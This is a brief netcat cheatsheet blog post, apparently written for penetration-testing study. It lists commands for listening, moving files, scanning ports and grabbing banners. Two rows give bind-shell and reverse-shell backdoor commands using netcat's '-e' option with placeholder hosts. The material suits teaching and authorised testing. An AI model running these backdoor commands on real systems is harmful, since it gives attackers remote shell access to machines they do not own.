Title: Yet another netcat cheatsheet
Summary: handy netcat commands
Category: cheatsheets
Tags: nettool, pwk
Date: 2020-03-23 13:15
Status: published

No|Description              |Command
--|-------------------------|--------------------------------------------------
1 |Simple listener          |nc -n IP -p PORT -wSECS
2 |Simple port probe        |nc HOST PORT _or_ nc -n IP PORT
3 |Simple file  receiver    |nc -nl IP -p PORT > OUT.FILE
4 |Simple file transmitter  |nc -n IP PORT < IN.FILE
5 |Capture tranferred data  |-o switch both for client and server
6 |Simple port scan         |nc -vnz -w1 IP LOPORT-HIPORT
7 |"Banner grabber"         |echo "" \| nc -vn -w1 IP LOPORT-HIPORT
8 |Trivial backdoor server  |nc -nl IP -p PORT -e SHELL
9 |Trivial reverse backdoor |nc SRV PORT -e shell _or_ nc -n IP PORT -e SHELL

 1. Just listen for incoming connections, a "chat" server
 2. Probe remote port, time out after SECS seconds
 3. Dump received data to file
 4. Transmit file to remote receiver
 5. Dump captured data in custom format. not catching protocols data
 6. Try remote ports in range between LOPORT and HIPORT, open ports are printed
 7. Similar to scan but tries to grab any human readable banners from services
 8. Simple backdoor, not all netcat versions may have been compiled with `-e`
    switch
 9. Simple reverse backdoor, `-e` note from above is obviously applicable

#### Common params
`-r` to randomize ports, can be used with port ranges  
`-u` to use UDP as a transport  
`-v` add verbosity  
`-T` set TOS (DSCP)  
`-q N` wait N seconds to quit after EOF  
`-i N` delay N seconds  
`-w N` time out after N seconds of connection attempt  

#### See also
 - [SANS cheatsheet](https://www.sans.org/security-resources/sec560/
netcat_cheat_sheet_v1.pdf)
